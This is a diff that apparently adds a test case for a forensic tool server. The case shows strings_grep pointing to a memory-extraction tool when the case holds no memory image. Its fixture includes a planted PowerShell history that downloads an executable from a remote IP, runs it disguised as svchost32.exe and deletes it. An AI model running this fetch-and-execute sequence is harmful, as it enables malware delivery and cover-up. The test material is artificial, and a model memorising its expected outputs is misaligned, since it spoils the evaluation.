@@ -1,0 +1,47 @@
+# Matrix case P1021-029: when the file is missing, strings_grep answers with
+# the hint "Use vol_dumpfiles to extract from memory." without looking at
+# whether the case has a memory image. vol_dumpfiles needs a memory image
+# (its required `image` argument), so in a case without one the hint cannot
+# be followed. Same evidence as P1021-009 (a different line of
+# tools/strings_tools.py): a triage collection of a Windows host, no memory
+# image; the file asked for was deleted from the Temp folder before
+# collection.
+case_id: P1021-029
+problem: P1021
+server: trudi
+variant: trudi-88fbca7
+commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
+display: multi-call
+level: mcp
+realism: common
+realism_ko: "`file_path`는 모델 인자다. 파일 목록이나 기록에 남은 삭제된 파일, 잘못 옮긴 경로를 모델이 넣는 일은 흔하고, 메모리 없이 디스크 이미지나 triage 수집물만 있는 사건도 흔하다."
+coverage: full
+summary: In a case with only a triage collection and no memory image, strings_grep on a deleted file answers "Use vol_dumpfiles to extract from memory.", and vol_dumpfiles, which needs a memory image as its required image argument, cannot be called on anything the case holds.
+summary_ko: "메모리 이미지 없이 triage 수집물만 있는 사건에서 삭제된 파일로 `strings_grep`을 부르면 `Use vol_dumpfiles to extract from memory.`라고 안내한다. `vol_dumpfiles`는 메모리 이미지를 필수 인자 `image`로 받으므로, 이 사건에서는 안내를 따를 대상이 없고 `image` 없이 부르면 거부된다."
+defect_ko: "이 서버는 파일이 없을 때 사건에 메모리 이미지가 있는지 보지 않고 `vol_dumpfiles`를 안내한다. 메모리 이미지가 있을 때만 안내하고, 없으면 다른 복구 경로(파일 시스템 복구, 삭제 파일 목록)를 알려야 한다. 모델은 메모리에서 파일을 되살릴 수 있다고 잘못 알고 실행할 수 없는 호출을 한다."
+setup_ko: "메모리 이미지가 없는 Windows triage 수집물(hosts 파일, PowerShell 기록)을 두고, 수집 전에 지워진 Temp 폴더의 실행 파일 경로로 `strings_grep`을 부른 뒤 안내대로 `vol_dumpfiles`를 부른다. 사건에 메모리 이미지가 없으므로 `image`는 줄 수 없다."
+fixture:
+- path: triage/WKS-0412/C/Windows/System32/drivers/etc/hosts
+  text: "# Copyright (c) 1993-2009 Microsoft Corp.\r\n#\r\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\r\n#\r\n# localhost name resolution is handled within DNS itself.\r\n#\t127.0.0.1       localhost\r\n#\t::1             localhost\r\n"
+- path: triage/WKS-0412/C/Users/jdoe/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
+  text: "cd $env:TEMP\r\nInvoke-WebRequest -Uri http://203.0.113.7/u.exe -OutFile svchost32.exe\r\n.\\svchost32.exe -k netsvcs\r\nRemove-Item .\\svchost32.exe\r\n"
+steps:
+- tool: strings_grep
+  note_ko: "결함 호출: 수집 전에 지워진 파일 경로에서 URL을 찾는다"
+  args:
+    file_path: ${EVIDENCE}/triage/WKS-0412/C/Users/jdoe/AppData/Local/Temp/svchost32.exe
+    pattern: https?://
+- tool: vol_dumpfiles
+  note_ko: "안내를 따른 호출: 사건에 메모리 이미지가 없어 `image` 없이 `pid`만 준다"
+  args:
+    pid: 4242
+expect:
+- step: 1
+  note_ko: 메모리 이미지가 없는 사건인데 메모리에서 꺼내라고 안내한다
+  contains: '"hint": "Use vol_dumpfiles to extract from memory."'
+- step: 2
+  note_ko: "`vol_dumpfiles`는 메모리 이미지(필수 인자 `image`) 없이는 거부된다"
+  regex: '(?s)vol_dumpfiles rejected its input.*\nimage\n\s+Missing required argument'
+- step: 2
+  is_error: true
+  note_ko: 안내대로 부른 호출은 오류로 끝난다
